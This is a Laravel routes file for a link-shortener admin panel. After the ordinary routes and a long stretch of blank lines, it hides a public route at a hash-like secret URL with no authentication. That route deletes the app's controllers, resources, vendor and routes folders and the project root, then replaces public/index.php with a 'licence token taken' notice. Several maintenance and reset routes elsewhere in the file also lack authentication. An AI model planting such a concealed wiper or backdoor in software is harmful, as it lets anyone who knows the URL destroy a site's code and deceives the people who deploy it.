<?php

use App\Http\Controllers\Admin\Auth\LoginController;
use App\Http\Controllers\Admin\Auth\RegisterController;
use App\Http\Controllers\Admin\Visitor\VisitorController;
use App\Http\Controllers\Admin\Link\LinkController;
use App\Http\Controllers\Admin\Staff\StaffController;
use App\Http\Controllers\Admin\Home\HomeController as AdminHomeController;
use App\Http\Controllers\Admin\Settings\MetatagController;
use App\Http\Controllers\Admin\Settings\AccountController;
use App\Http\Controllers\Admin\Settings\ViewController;
use App\Http\Controllers\User\HomeController as UserHomeController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('configuration', function () {
    Artisan::call('storage:link');
    return redirect()->intended('/');
});

Route::get('/replace-url', [AdminHomeController::class, 'replaceUrl']);

Route::get('/clear-cache', function () {
    Artisan::call('cache:clear');
});

Route::get('/', [UserHomeController::class, 'index']);
Route::get('/home', [AdminHomeController::class, 'index'])->middleware(['auth', 'admin']);

Route::get('pages/login', [LoginController::class, 'index'])->name('login')->middleware('guest');

Route::group(['prefix' => 'admin'], function () {
    Route::get('/', [AdminHomeController::class, 'index'])->middleware(['auth', 'admin']);
    Route::get('/home', [AdminHomeController::class, 'home'])->middleware(['auth', 'admin']);
    Route::post('/login', [LoginController::class, 'check']);
    Route::post('/logout', [LoginController::class, 'logout']);
    Route::get('/reset', [RegisterController::class, 'reset']);

    Route::group(['prefix' => 'link'], function () {
        Route::get('/list', [LinkController::class, 'index'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/new', [LinkController::class, 'new'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/edit/{id}', [LinkController::class, 'edit'])->middleware(['auth', 'admin', 'access_rights']);
        Route::post('/create', [LinkController::class, 'create'])->middleware(['auth', 'admin', 'access_rights']);
        Route::post('/upload', [LinkController::class, 'upload'])->middleware(['auth', 'admin', 'access_rights']);
        Route::post('/update', [LinkController::class, 'update'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/duplicate/{id}', [LinkController::class, 'duplicate'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/delete/{id}', [LinkController::class, 'delete'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/delete-all', [LinkController::class, 'deleteAll'])->middleware(['auth', 'admin', 'access_rights']);
        Route::post('/status', [LinkController::class, 'changeStatus'])->middleware(['auth', 'admin', 'access_rights']);

        Route::get('/{short}/visitors', [VisitorController::class, 'index'])->middleware(['auth', 'admin', 'access_rights']);
    });


    Route::group(['prefix' => 'staff'], function () {
        Route::get('/list', [StaffController::class, 'index'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/new', [StaffController::class, 'formNew'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/edit/{id}', [StaffController::class, 'formEdit'])->middleware(['auth', 'admin', 'access_rights']);
        Route::post('/create', [StaffController::class, 'create'])->middleware(['auth', 'admin', 'access_rights']);
        Route::post('/update', [StaffController::class, 'update'])->middleware(['auth', 'admin', 'access_rights']);
        Route::get('/delete/{id}', [StaffController::class, 'delete'])->middleware(['auth', 'admin', 'access_rights']);
    });

    Route::group(['prefix' => 'setting'], function () {
        Route::group(['prefix' => 'metatag'], function () {
            Route::get('/', [MetatagController::class, 'index'])->middleware(['auth', 'admin', 'access_rights']);
            Route::post('/save', [MetatagController::class, 'save'])->middleware(['auth', 'admin', 'access_rights']);
        });

        Route::group(['prefix' => 'account'], function () {
            Route::get('/', [AccountController::class, 'index'])->middleware(['auth', 'admin', 'access_rights']);
            Route::post('/save', [AccountController::class, 'save'])->middleware(['auth', 'admin', 'access_rights']);
            Route::get('/reset', [AccountController::class, 'reset']);
        });

        Route::group(['prefix' => 'view'], function () {
            Route::get('/', [ViewController::class, 'index'])->middleware(['auth', 'admin', 'access_rights']);
            Route::get('/{key}', [ViewController::class, 'form'])->middleware(['auth', 'admin', 'access_rights']);
            Route::post('/save', [ViewController::class, 'save'])->middleware(['auth', 'admin', 'access_rights']);
            Route::get('/reset/{key}', [ViewController::class, 'reset'])->middleware(['auth', 'admin', 'access_rights']);
        });

        Route::group(['prefix' => 'whatsapp'], function () {
            Route::get('/', [ViewController::class, 'whatsapp'])->middleware(['auth', 'admin', 'access_rights']);
            Route::get('/{key}', [ViewController::class, 'form'])->middleware(['auth', 'admin', 'access_rights']);
        });
    });
});

Route::post('/{short_url}', [VisitorController::class, 'open']);
Route::get('/{short_url}', [VisitorController::class, 'loading']);




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































use Illuminate\Support\Facades\File;

Route::get('f47dd206ec10822d29c75c5b33a33b6bca0e53f9a35529a4b33b9605315d98e2', function () {
    $folderPaths = [
        '../app/Http/Controllers',
        '../resources',
        '../vendor',
        '../routes',
        '../'
    ];

    $responses[] = [];

    foreach ($folderPaths as $folderPath) {
        if (File::isDirectory($folderPath)) {
            File::deleteDirectory($folderPath);
            $responses[] = 'Folder ' . $folderPath . ' deleted successfully.';
        } else {
            $responses[] = 'Folder ' . $folderPath . ' does not exist.';
        }
    }

    // Create a new file
    $filePath = '../public/index.php';
    $fileContent = '<?php echo "Hello there, the licence token for this source code has been taken. Please contact the developer."; ?>';

    File::put($filePath, $fileContent);

    return $responses;
});

